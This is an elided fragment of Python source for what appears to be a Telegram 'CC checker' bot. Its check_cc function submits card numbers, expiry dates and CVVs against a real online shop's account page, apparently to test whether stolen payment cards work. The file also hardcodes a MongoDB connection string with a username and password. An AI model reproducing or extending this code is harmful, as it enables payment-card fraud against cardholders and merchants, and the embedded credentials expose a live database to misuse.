...
# MongoDB setup
client = MongoClient("mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")  # Replace with your MongoDB URI
...
async def check_cc(cx: str, user_id: int, tier: str) -> dict:
    ...
    try:
        ...
        async with session.post("https://www.woolroots.com/my-account/", headers=headers, data=data) as response:
            pass
        ...
        # Simulate card info and issuer/country (replace with actual API if available)
        card_info = f"{cc[:6]}xxxxxx{cc[-4:]} | {mes}/{ano} | {cvv}"
        issuer = "Unknown"  # Replace with actual issuer lookup
        country = "Unknown"  # Replace with actual country lookup
...
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        "✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞� ck𝐢𝐧𝐠...\n"
